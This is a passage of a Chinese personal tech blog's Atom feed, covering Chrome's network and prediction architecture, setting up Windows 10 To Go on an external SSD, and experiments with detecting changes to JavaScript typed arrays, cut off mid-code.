<h2 id="在移动平台上的架构和性能">在移动平台上的架构和性能</h2><p><img src="/images/high-perf-network-in-chrome-trans/mobile.png" alt="mobile"></p>
<p>即便是谨慎估计，移动浏览器的使用率也呈现出指数级的增长，可以预期在不远的将来，它将蚕食桌面浏览器的份额，令其黯然失色。因此对于Chrome团队，带给用户良好的移动浏览体验是具有极高优先级的。在2012年初，<a href="http://www.google.com/intl/en/chrome/browser/mobile/android.html" target="_blank" rel="external">Chrome Android</a>推出，几个月后，<a href="http://www.google.com/intl/en/chrome/browser/mobile/ios.html" target="_blank" rel="external">Chrome iOS</a>也推向市场。</p>
<p><strong>对于Chrome的移动版本，你需要了解的头一件事情便是它不是桌面浏览器的直接移植</strong>，如果那样将不能获得最好的用户体验。客观来说，移动环境资源更加紧缺，并有着更多不同的操作参数：</p>
<ul>
<li>桌面用户使用鼠标浏览，可能由重叠的窗口，有很大的显示屏，并且一半没有电池能耗限制，通常有一个稳定的网络连接，并有更大的磁盘存储和内存。</li>
<li>移动用户使用触摸和手势进行浏览，有很小的屏幕，需要考虑能耗，网络连接不畅，只有受限的存储和内存。</li>
</ul>
<p>更进一步来说，很难说一个设备是典型的“<em>移动设备</em>”，反倒是很大量的设备的性能都各不相同，Chrome必须对每个设备都能很好的适应，才能带来最佳的性能。幸运的是，正是因为多种多样的运行模型，Chrome才能做到这种适应性。</p>
<p><img src="/images/high-perf-network-in-chrome-trans/android-chrome.png" alt="android-chrome"></p>
<p><strong>在Android设备上，Chrome也使用了和桌面版本相同的多进程架构</strong>，有一个Browser进程，和一个或多个Renderer进程。唯一的不同便是移动设备的内存容量限制，Chrome不太可能还是采取每个tab一个Renderer的策略。Chrome通过可用的内存，和设备的其他限制条件，来确定最优的Renderer数量。它会在多个tab中分享Renderer进程。</p>
<p>在只有很少的资源可用，或者是Chrome不能启动多进程架构的时候，它还是可以切换到一个单进程多线程的运行模型中。事实上，<strong>在iOS设备上，由于底层平台的沙箱限制，Chrome就是这么做的——单进程多线程运行</strong>。</p>
<p>那网络性能呢？首先，<strong>在Android和iOS中，Chrome使用了同样的网络栈，其他平台也一样</strong>。这让Chrome可以在多平台下实现相同的网络优化，这对Chrome的性能优化工作来说十分重要。但是，某些参数比如预测优化的优先级、Socket的超时、管理逻辑和缓存大小，在不同平台间还是有所区别的，并随着设备的能力和使用的网络动态调整。</p>
<p>例如，为了节约电池，移动版Chrome有选择地推迟关闭空闲的Socket，仅仅当打开新的Socket后，才会关闭旧的，这样可以最小化发射功率。类似的是，我们上文中提到的预渲染，是需要一笔不菲的网络和处理资源支出的，这通常在用户处于WIFI环境下才会开启。</p>
<p>对于Chrome开发团队来说，优化移动浏览体验是处于最高优先级列表中的一个，可以预见的是，<strong>很多新的提升</strong>将不断推出。事实上，这个话题值得单独成文，兴许在POSA系列的下一篇中。</p>
<h2 id="推测式的Chrome预测优化">推测式的Chrome预测优化</h2><p><img src="/images/high-perf-network-in-chrome-trans/chrome-wings.png" alt="chrome-wings"></p>
<p><strong>你越是使用，Chrome越快</strong>。这得归功于<code>Predictor</code>单例对象。它在Browser进程中国被初始化，而它的职责就是观察网络模式，学习并预测用户接下来可能的动作。比如说：</p>
<ul>
<li>当用户将鼠标置于某一个超链接上时，这说明他接下来可能会导航到那里，Chrome便可以预先开始进行DNS查询，甚至预先进行TCP握手。等当用户真正点击的时候，这通常已经过去了大约200ms，我们很可能已经完成了DNS和TCP阶段，为这次浏览节约了数百毫秒的额外时延。</li>
<li>在Omnibox（URL）中输入时，会根据相似度提示，这也会激活类似的预测优化：DNS查询、TCP预连，甚至可以在后台预先渲染出这个页面。</li>
<li>我们每人都有最爱的一些网站。Chrome可以从这些站点的资源中学习，并预测性地预先解析、获取这些资源来加速浏览体验。</li>
<li>这个列表还能写很长…</li>
</ul>
<p>Chrome会发现网络的拓扑，并在你使用时学习你独有的浏览习惯。如果一切顺利的话，它将为用户每次浏览节省下数百毫秒的延时，让用户接近“秒开”的畅快体验。为了做到这一点，Chrome利用了四个核心优化技术：</p>
<table>
<thead>
<tr>
<th style="text-align:center"></th>
<th style="text-align:left"></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">DNS 预解析</td>
<td style="text-align:left">提前进行域名解析，来避免DNS延时</td>
</tr>
<tr>
<td style="text-align:center">TCP 预连接</td>
<td style="text-align:left">提前和目标服务器进行连接，来避免TCP握手延时</td>
</tr>
<tr>
<td style="text-align:center">资源预加载</td>
<td style="text-align:left">提前获取关键资源文件，来加速页面的渲染</td>
</tr>
<tr>
<td style="text-align:center">页面预渲染</td>
<td style="text-align:left">提前获取整个页面，包括所有的资源文件，当用户真正点击时，带来秒开的体验</td>
</tr>
</tbody>
</table>
<p>每个优化动作在触发前，都要经过一系列的限制条件，毕竟，这仅仅只是通过预测来优化，如果预测失败的话，不必要的计算和网络浏览就白消耗了，甚至会对用户的实际浏览造成负面的影响。</p>
<p>那Chrome是如何解决这一问题的呢?<strong>预测器会处理尽量多的信号，其中包括了用户产生的动作、历史浏览记录和render、网络栈产生的信号</strong>。</p>
<p>和<code>ResourceDispatcherHost</code>，一个负责Chrome内部所有网络活动的实体，不同的是，<code>Predictor</code>对象对Chrome内部的用户和网络创建了一系列过滤器：</p>
<ul>
<li>IPC管道过滤器，监测Render进程的信号</li>
<li><code>ConnectInterceptor</code>实体被添加在每一个Request中，这样的话它便可以观察流量模式，并为每个Request记录下数据（success metrics）。</li>
</ul>
<p>举个栗子来说，Render进程在如下情况发生时，都会向Browser进程发送消息。请查看在<code>ResolutionMotivation</code>(<a href="http://code.google.com/searchframe#OAMlx_jo-ck/src/chrome/browser/net/url_info.h&amp;l=35" target="_blank" rel="external">url_info.h</a>)的定义：</p>
<figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">ResolutionMotivation</span> &#123;</span></span><br><span class="line">    <span class="constant">MOUSE_OVER_MOTIVATED</span>,     <span class="regexp">//</span> 用户触发的鼠标经过事件<span class="constant">Mouse</span>-over initiated by the user.</span><br><span class="line">    <span class="constant">OMNIBOX_MOTIVATED</span>,        <span class="regexp">//</span> <span class="constant">Omni</span>-box 提示</span><br><span class="line">    <span class="constant">STARTUP_LIST_MOTIVATED</span>,   <span class="regexp">//</span> 本资源在<span class="number">10</span>大最常访问之列</span><br><span class="line">    <span class="constant">EARLY_LOAD_MOTIVATED</span>,     <span class="regexp">//</span> 某些情况下我们使用预加载来在发射真实的<span class="constant">Request</span>前预热连接</span><br><span class="line"></span><br><span class="line">    /<span class="regexp">/ 如下和预测式预加载有关，由浏览触发</span><br><span class="line">    /</span><span class="regexp">/ The following involve predictive prefetching, triggered by a navigation.</span><br><span class="line">    STATIC_REFERAL_MOTIVATED,  /</span><span class="regexp">/ 外界知识库</span><br><span class="line">    LEARNED_REFERAL_MOTIVATED, /</span><span class="regexp">/ 从之前的浏览习惯中总结得到</span><br><span class="line">    SELF_REFERAL_MOTIVATED,    /</span><span class="regexp">/ 猜测会产生第二次连接</span><br><span class="line"></span><br><span class="line">    /</span><span class="regexp">/ &lt;snip&gt; ..,</span><br><span class="line">&#125;;</span><br><span class="line">```</span></span><br></pre></td></tr></table></figure>
<p>获知一个信号后，预测器的目标便是评估其正确的可能性，若资源获取到后，激活事件。每个预测都有成功性，优先级和一个有时效的时间戳。组合起来可以建立一个内部的优先队列来优化预测。最终，对于每一个从此队列发出的Request，预测器还会持续追踪它的成功率，这让后续优化成为可能。</p>
<h2 id="果壳中的Chrome网络架构">果壳中的Chrome网络架构</h2><ul>
<li>Chrome使用一个<strong>多进程架构</strong>，这将Render和Browser进程隔离</li>
<li>Chrome维护了一个<strong>资源调度分配的单例</strong>，它被所有Render进程公用，并运行在Browser进程中</li>
<li>网络栈是一个<strong>快平台</strong>，大多数情况下单线程的库</li>
<li>网络栈使用<strong>非阻塞</strong>的操作来管理所有的网络操作</li>
<li>共享的网络栈让资源优先级、重用策略更加高效，并让跨进程全局优化成为可能</li>
<li>每个Render进程都和资源分配器通过IPC通信</li>
<li>预测器拦截资源Request和Response，学习并优化未来的Request</li>
<li><strong>预测器会安排DNS，TCP，甚至是资源请求</strong>，这基于学习到的网络模式，当用户浏览时能节省数百毫秒</li>
</ul>
<p>（未完待续）</p>
]]></content>
    <summary type="html">
    <![CDATA[<blockquote>
<p>看到Ilya Grigorik写的<a href="https://www.igvita.com/posa/high-performance-networking-in-google-chrome/" target="_blank" rel="ex]]>
    </summary>
    
      <category term="browser" scheme="http://yqf3139.github.io/tags/browser/"/>
    
      <category term="chrome" scheme="http://yqf3139.github.io/tags/chrome/"/>
    
      <category term="network" scheme="http://yqf3139.github.io/tags/network/"/>
    
      <category term="trans" scheme="http://yqf3139.github.io/categories/trans/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[在外置SSD上体验 Windows 10 to go]]></title>
    <link href="http://yqf3139.github.io/2015/12/12/windows-to-go-with-SSD/"/>
    <id>http://yqf3139.github.io/2015/12/12/windows-to-go-with-SSD/</id>
    <published>2015-12-12T03:16:08.000Z</published>
    <updated>2016-09-02T02:40:10.886Z</updated>
    <content type="html"><![CDATA[<h1 id="为什么需要这么折腾？">为什么需要这么折腾？</h1><p>我在主系统转为Linux后，虽然轻量级的Office编辑和图片/视频编辑是可以进行的，比如利用免费的LibreOffice、Kdenlive、Inkscape。对于图片处理，某些命令行工具如<code>convert</code>，可以直接脚本调用，灵活行和自动性反而比GUI软件更高。</p>
<p>但不得不承认，偶尔正式场合编辑文档表格和幻灯、PS、网银操作，还是逃脱不了更加普适的Windows。对于标准的Office套件，Adobe套件和Visual Studio等神一般的Windows软件，还是需要找一个解决方案来愉快地使用的。然而并没有入Mac的打算，所以我还是准备采用各种方法使用Windows。正好这样的话，也有机会再摸一摸Windows上的软件，比如微信电脑版等等。</p>
<p>所以对于我80%以上是直接使用Linux，一个纯粹的系统即可，有时需要使用Office等时需要短时间密集的Windows使用。</p>
<p>首先有两个方案也不错，但我不是很想使用，一个是Wine，兼容性总是永远的痛，一个是双系统，需要比较大的硬盘，而且相对比较麻烦，再后期与Windows to go对比后，我也抛弃了这个方案。</p>
<h1 id="方案一:_虚拟机">方案一: 虚拟机</h1><p>虚拟机对于高性能的主机适用，对于我2012年的笔记本，运行XP非常流畅，但Win7比较吃力。虚拟机的优点很明显，做好系统后，几个文件组成的虚拟机可以任意备份与拷贝，所以我常备着几个干净的Xp和Win7虚拟机，和装有Office的。</p>
<p><img src="/images/windows-to-go-with-SSD/vm.png" alt="vm"></p>
<h1 id="方案二:_远程桌面">方案二: 远程桌面</h1><p>在实验室有了高性能主机入驻后（研究生的开发机，非常眼馋），我便一直寻求办法远程使用它。在争取得到学长同意后，我登记了账号，并网上查询到方法，可以让多人同时登入一台Windows主机操作，这样当学长使用电脑的时候，我还是可以远程登陆进行操作。</p>
<p>关于操作顺畅的问题，Microsoft的RDP远程桌面协议已经十分高效，再加上如果是校园以太网连接，操作顺滑，甚至可以看视频。</p>
<p>使用远程桌面的好处也有不少：</p>
<ol>
<li>不占用我本地的计算/存储资源，我可以同时开发与处理文档。</li>
<li>系统和我本机无关，我可以是Windows/Linux/Mac/iOS/Android，登陆即可享用主机资源。</li>
<li>只要网络通畅，随时随地登录。 </li>
</ol>
<p>当然也有一些弊端，比如受他人限制，远程桌面使用的虚拟显卡驱动会造成某些软件问题，需要插U盘的话比较麻烦（可以直接挂载本地硬盘共享）。</p>
<p>推荐一个Linux上的开源远程桌面客户端，<a href="https://github.com/FreeRDP/FreeRDP" target="_blank" rel="external">FreeRdp</a>，可以添加剪贴板共享、挂载本地磁盘等功能，其他平台微软均有提供。<br><img src="/images/windows-to-go-with-SSD/freerdp.png" alt="vm"></p>
<h1 id="方案三:_外置SSD安装Windows_to_go">方案三: 外置SSD安装Windows to go</h1><p>不过虚拟机在我笔记本上总是跑不畅快，远程桌面也并不是随时都能享用，怎样才能一直运行我的Windows（各种环境齐全），但又不受机器的限制，也就是不写死在一台主机中呢？</p>
<p>事实证明<code>Windows to go</code>就是符合我的期望的，它可以直接将Windows装在外置硬盘和U盘中。这样我只需要将这个外置存储设备插入一台主机，便选择从外置存储直接启动了，这里具体请参考微软的<a href="">说明</a>，其会在启动时判别硬件并加载驱动，就算不是同一机器，也能进入同一个Windows实例。<code>Chrome OS</code>则更方便，登录即可，不过现在还不适用于我的情况，技术上也不成熟。</p>
<p>USB3.0可以达到5Gb/s的传输速率，高于Sata3的极限，所以普通Sata3硬盘是可以这样用的，也可以弄一个高速USB3.0 U盘，但为了以后硬盘可以重用于其他，我还是牺牲了便携性。</p>
<h2 id="Windows_8_+_HDD_+_USB_3-0">Windows 8 + HDD + USB 3.0</h2><p>于是我在十一期间立马找了一个320G的硬盘，配合一个USB3的外置盒，边体验了一番。<br>事实证明体验很差，不是因为系统不好用，而是因为HDD加劣质的外置盒太慢了。</p>
<p>两秒的延时，太慢了。<br><img src="/images/windows-to-go-with-SSD/winsys-hdd.jpg" alt="lantency"></p>
<p>在看到<a href="https://luolei.org/imac-5k-external-usb-ssd-update/" target="_blank" rel="external">其他人用外置SSD做iMac系统盘后</a>，我才终于决定一定需要弄一个入门的SSD来做Windows to go，这样IO便不是瓶颈，如果有高性能的主机的话，我便可以直接占领其计算资源，作图渲染视频就能节省很多时间。</p>
<h2 id="Windows_10_+_SSD_+_USB3-0（UASP支持）">Windows 10 + SSD + USB3.0（UASP支持）</h2><h3 id="购买">购买</h3><p>硬盘性能、USB3.0协议、外置盒的主控芯片的性能，支持UASP协议都是值得考虑的，综合经济实力和使用频率考虑，由于只要装系统/Office/Adobe，120G足够，如果需要编辑的文件很大（如视频），可以后再加移动固态硬盘。</p>
<blockquote>
<p>USAP是USB-IF所制定的一个新传输协议用于透过USB接口连接序列设备，提供大容量储存设备的传输速度高达20％，并降低CPU的利用率、数据延迟和等待时间，USAP协议提供了高性能主机及设备之间的数据传输。 </p>
</blockquote>
<p>最终选择：<br>SSD   ： 入门级120G Sandisk加强版，京东购入比较放心。<br>外置盒： ORICO 2589S3，USB3.0并支持UASP，淘宝购入。</p>
<p>共356元。</p>
<h3 id="安装">安装</h3><ol>
<li>安装SSD，盒子是免工具拆卸，立马搞定。</li>
<li>格式化为NTFS，测速发现不错。</li>
<li>使用<a href="https://rufus.akeo.ie/" target="_blank" rel="external">rufus</a>工具，选择Windows 10镜像，并勾选<code>Windows to go</code>，过程非常傻瓜。</li>
<li>重启选择外置SSD启动。</li>
</ol>
<p><img src="/images/windows-to-go-with-SSD/rufus_en.png" alt="rufus"></p>
<h3 id="使用">使用</h3><p>装完各种常用应用后硬盘使用不超一半，测速满意，和同学的低端SSD系统盘对比后发现差距不大。</p>
<p><img src="/images/windows-to-go-with-SSD/as-ssd-test.jpg" alt="rufus"><br><img src="/images/windows-to-go-with-SSD/winsys-ssd.jpg" alt="rufus"></p>
<p>相比之下原来硬盘的顺序读写不到50MB/s，4K根本跑不完。</p>
<p>正好开发机性能不错，只安装了Ubuntu，也启动尝试了一下。</p>
<p><img src="/images/windows-to-go-with-SSD/winsys-info.jpg" alt="rufus"><br><img src="/images/windows-to-go-with-SSD/winsys-cpu.jpg" alt="rufus"></p>
<p>最终认为这次折腾是值得的，终于可以再次畅快地玩玩Windows 10了，并且所有环境都在一个随时硬盘中，节省了重复布置环境的麻烦。</p>
]]></content>
    <summary type="html">
    <![CDATA[<h1 id="为什么需要这么折腾？">为什么需要这么折腾？</h1><p>我在主系统转为Linux后，虽然轻量级的Office编辑和图片/视频编辑是可以进行的，比如利用免费的LibreOffice、Kdenlive、Inkscape。对于图片处理，某些命令行工具如<code>c]]>
    </summary>
    
      <category term="linux" scheme="http://yqf3139.github.io/tags/linux/"/>
    
      <category term="ssd" scheme="http://yqf3139.github.io/tags/ssd/"/>
    
      <category term="windows" scheme="http://yqf3139.github.io/tags/windows/"/>
    
      <category term="tech" scheme="http://yqf3139.github.io/categories/tech/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[检测Javascript中变量的修改]]></title>
    <link href="http://yqf3139.github.io/2015/11/28/check-js-var-update/"/>
    <id>http://yqf3139.github.io/2015/11/28/check-js-var-update/</id>
    <published>2015-11-28T08:20:08.000Z</published>
    <updated>2016-01-23T21:57:20.050Z</updated>
    <content type="html"><![CDATA[<h1 id="问题描述">问题描述</h1><p>目前在做的小项目中，我们在浏览器中通过Hook浏览器的API，截获目标程序对浏览器API的调用。比如对于Webgl的网页程序，我们就能截获所有的gl指令，这其中主要是截获参数列表。把这些gl指令翻译为Opengl ES标准的话便可以编译为一个其他设备上的原生应用了。</p>
<p>图形的绘制过程中经常会有大量的数组需要传递入GPU，这就造成了我们截获了大量的数组。如果想直接把这些数据保存在浏览器内存中，压力很大，实时流到其他服务器上的话也带来了stringfy瓶颈和传输瓶颈。虽然对于Javascript中的Typed Array，我们现在直接二进制传输到服务器上，是否能只传输变化的数组，或者是只传输数组的delta，这个是一个潜在的优化。当然，如果发现大部分要传输的数组都是改变过的话，或者是检测改变的开销大于直接传输的开销（毕竟是CPU时间对抗IO时间，而且由于检测比如会使目标程序运行变慢），完全便可以不考虑进行数组改变的检测了。</p>
<p>对于给定Javascript的TypedArray，我们的目标便是当截获到的gl指令需要使用它的时候，我们需要能知道它是否内容发生了改动，更进一步能记录出上次截获到这次截获间的delta。<br>花了一些时间进行探索，然而最后还是无解，并也没有方法能占用资源尽量少地做到标记修改，记录如下。</p>
<h1 id="暴力检测">暴力检测</h1><p>这个方法不需要多说，不过检测的时间消耗太多，由于消耗了Webgl每帧的CPU时间，很容易造成CPU性能瓶颈，导致Fps下降。</p>
<h1 id="Object-observe()_/_Array-observe()">Object.observe() / Array.observe()</h1><p>最先查询到的便是两个内建的API，直接来看MDN上的使用：<br><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">var obj = &#123;</span><br><span class="line">    foo: <span class="number">0</span>,</span><br><span class="line">    bar: <span class="number">1</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">Object.observe(obj, <span class="keyword">function</span>(changes) &#123;</span><br><span class="line">    console.log(changes);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">obj.baz = <span class="number">2</span>;</span><br><span class="line">// [&#123;name: <span class="string">'baz'</span>, object: &lt;obj&gt;, type: <span class="string">'add'</span>&#125;]</span><br><span class="line"></span><br><span class="line">obj.foo = <span class="string">'hello'</span>;</span><br><span class="line">// [&#123;name: <span class="string">'foo'</span>, object: &lt;obj&gt;, type: <span class="string">'update'</span>, oldValue: <span class="number">0</span>&#125;]</span><br><span class="line"></span><br><span class="line"><span class="keyword">delete</span> obj.baz;</span><br><span class="line">// [&#123;name: <span class="string">'baz'</span>, object: &lt;obj&gt;, type: <span class="string">'delete'</span>, oldValue: <span class="number">2</span>&#125;]</span><br><span class="line">```</span><br></pre></td></tr></table></figure></p>
<p>一开始看到的时候感觉非常符合我的需求，并且还区分了改动的类型，比如<code>update</code>、<code>add</code>、<code>delete</code>类型。<br>应该现在很多前端的工具就使用Observe便可以完全数据到显示的单向同步了。<br>于是尝试了一下在Typed Array上的操作：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">var obj = <span class="keyword">new</span> Int16Array([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]);</span><br><span class="line">Object.observe(obj, function(changes) &#123;</span><br><span class="line">    console.<span class="built_in">log</span>(changes);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">obj[<span class="number">0</span>] = <span class="number">9</span>; <span class="comment">// changed</span></span><br><span class="line">obj[<span class="number">0</span>] = <span class="number">9</span>; <span class="comment">// unchanged</span></span><br><span class="line">obj.sort(); <span class="comment">// changed</span></span><br><span class="line"></span><br><span class="line">```</span><br></pre></td></tr></table></figure>
<p>不过后来看到这么一个解释:</p>
<blockquote>
<p>The Object.observe() method is used for asynchronously observing the changes<br>to an object. It provides a stream of changes in the order in which they<br>occur.</p>
</blockquote>
<p>说明变更事件是异步通知的，比如可以这样实验一下：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="keyword">new</span> <span class="built_in">Int16Array</span>([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]);</span><br><span class="line">a.isDirty = <span class="literal">false</span>;</span><br><span class="line"><span class="built_in">Object</span>.observe(a, <span class="function"><span class="keyword">function</span>(<span class="params">changes</span>) </span>&#123;</span><br><span class="line">      a.isDirty = <span class="literal">true</span>;</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="string">'c'</span>);</span><br><span class="line">&#125;);</span><br><span class="line">a[<span class="number">0</span>]=<span class="number">9</span>;</span><br><span class="line"><span class="built_in">console</span>.log(a.isDirty);</span><br><span class="line">setTimeout(<span class="string">'console.log(a.isDirty);'</span>,<span class="number">100</span>);</span><br><span class="line"></span><br><span class="line">output:</span><br><span class="line"><span class="literal">false</span></span><br><span class="line">c</span><br><span class="line"><span class="literal">true</span></span><br><span class="line"><span class="string">``</span><span class="string">`</span></span><br></pre></td></tr></table></figure></p>
<p>这就带来了问题，由于Javascript执行是单线程的，可能在webgl程序刚修改完后便被我截获了这个数组，但修改通知没到，我就已经错误判断数组未改变了，由于我相当于是对每个gl命令的参数进行快照，无法在未来进行记录，如果停止我当前线程的，会带来严重的性能问题。</p>
<h1 id="Object-defineProperty">Object.defineProperty</h1><p>这个方法可以为对象定义属性，并能对属性的访问进行详细的控制，最简单的话我们给定义get和set函数，举例说明：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = &#123;&#125;;</span><br><span class="line"><span class="keyword">var</span> shadow = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>];</span><br><span class="line"><span class="built_in">Object</span>.defineProperty(arr, <span class="string">'0'</span>, &#123;</span><br><span class="line">  get: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'get'</span>);</span><br><span class="line">    <span class="keyword">return</span> shadow[<span class="string">'0'</span>];</span><br><span class="line">  &#125;,</span><br><span class="line">  set: <span class="function"><span class="keyword">function</span>(<span class="params">v</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'set'</span>);</span><br><span class="line">    shadow[<span class="string">'0'</span>] = v;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="string">``</span><span class="string">`</span></span><br></pre></td></tr></table></figure>
<p>通常对外暴露的get，set中要访问一个内部的变量，以防止递归访问属性的get或是set。<br>这个方法其实是多加入了一个proxy的对象。并且TypedArray并不能重写数字属性的get/set，只能通过一个proxy对象了。</p>
<p>一个简陋的实现，直接替换浏览器中提供的API:<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> _Float32Array = <span class="built_in">Float32Array</span>;</span><br><span class="line"><span class="built_in">Float32Array</span> = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="comment">// 这里需要罗列出内部的属性和函数名</span></span><br><span class="line">  <span class="comment">// 因为数组类型只能for遍历数字属性</span></span><br><span class="line">  <span class="keyword">var</span> list = [</span><br><span class="line">    <span class="string">"BYTES_PER_ELEMENT"</span>,</span><br><span class="line">    <span class="string">"__defineGetter__"</span>,</span><br><span class="line">    <span class="string">"__defineSetter__"</span>,</span><br><span class="line">    <span class="string">"__lookupGetter__"</span>,</span><br><span class="line">    <span class="string">"__lookupSetter__"</span>,</span><br><span class="line">    <span class="string">"constructor"</span>,</span><br><span class="line">    <span class="string">"buffer"</span>,</span><br><span class="line">    <span class="string">"byteLength"</span>,</span><br><span class="line">    <span class="string">"byteOffset"</span>,</span><br><span class="line">    <span class="string">"entries"</span>,</span><br><span class="line">    <span class="string">"hasOwnProperty"</span>,</span><br><span class="line">    <span class="string">"isPrototypeOf"</span>,</span><br><span class="line">    <span class="string">"keys"</span>,</span><br><span class="line">    <span class="string">"length"</span>,</span><br><span class="line">    <span class="string">"propertyIsEnumerable"</span>,</span><br><span class="line">    <span class="string">"set"</span>,</span><br><span class="line">    <span class="string">"subarray"</span>,</span><br><span class="line">    <span class="string">"toLocaleString"</span>,</span><br><span class="line">    <span class="string">"toString"</span>,</span><br><span class="line">    <span class="string">"valueOf"</span>,</span><br><span class="line">    <span class="string">"values"</span>,</span><br><span class="line">  ]</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 初始化的函数可能会有三个参数，还未处理</span></span><br><span class="line">  <span class="keyword">var</span> a = <span class="keyword">new</span> _Float32Array(<span class="built_in">arguments</span>[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">this</span>.a = a;</span><br><span class="line">  <span class="keyword">var</span> b = <span class="keyword">this</span>;</span><br><span class="line">  <span class="keyword">this</span>.isDirty = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">  list.forEach(<span class="function"><span class="keyword">function</span> (<span class="params">key</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span>(a[key]) == <span class="string">'function'</span>) &#123;</span><br><span class="line">      b[key] = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        b.isDirty = <span class="literal">true</span>;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'invoke'</span>, key);</span><br><span class="line">        <span class="keyword">return</span> a[key].apply(a, <span class="built_in">arguments</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="built_in">Object</span>.defineProperty(b, key, &#123;</span><br><span class="line">        configurable: <span class="literal">true</span>,</span><br><span class="line">        enumerable: <span class="literal">true</span>,</span><br><span class="line">        get: <span class="function"><span class="keyword">function</span>(<span 